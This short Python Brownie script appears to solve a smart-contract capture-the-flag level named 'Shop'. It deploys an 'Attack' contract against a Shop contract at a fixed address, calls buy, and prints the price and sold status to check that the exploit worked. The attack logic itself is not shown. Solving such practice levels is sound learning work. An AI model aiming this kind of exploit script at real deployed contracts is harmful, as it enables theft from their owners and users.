from brownie import Attack, Shop, Contract
from scripts.helpful_scripts import *
from web3 import Web3

account = getAccount()

shop = Contract.from_abi("Shop", "0xc6f46EDF46Aeb466296BE51600CB0a908121D1D7", Shop.abi)


def main():
    attack = Attack.deploy({"from": account})
    tx = attack.buy({"from": account})
    print(shop.price())
    print(shop.isSold())
